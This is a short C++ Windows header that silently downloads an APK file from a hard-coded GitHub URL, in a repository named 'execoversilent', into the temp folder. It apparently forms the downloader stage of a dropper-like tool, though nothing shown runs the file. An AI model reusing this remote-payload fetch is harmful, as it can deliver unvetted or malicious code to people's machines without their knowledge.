#pragma once
#ifndef WIN32_LEAN_AND_MEAN
#define WIN32_LEAN_AND_MEAN
#endif
#include <winsock2.h>
#include <windows.h>
#include <urlmon.h>
#include <string>
#include <iostream>

#pragma comment(lib, "urlmon.lib")

// Default GitHub Direct Download URL for apks_bacend.apk
inline std::string g_GitHubApkUrl = "https://raw.githubusercontent.com/authmvp-dot/execoversilent/main/apks_bacend.apk";

inline std::string GetTempApkFilePath()
{
    char tempPath[MAX_PATH];
    GetTempPathA(MAX_PATH, tempPath);
    return std::string(tempPath) + "apks_bacend.apk";
}

inline bool DownloadApkFromGitHub(const std::string& downloadUrl = "")
{
    std::string url = downloadUrl.empty() ? g_GitHubApkUrl : downloadUrl;
    std::string destPath = GetTempApkFilePath();

    // Delete existing old temp APK if present
    DeleteFileA(destPath.c_str());

    HRESULT hr = URLDownloadToFileA(NULL, url.c_str(), destPath.c_str(), 0, NULL);
    return (hr == S_OK);
}
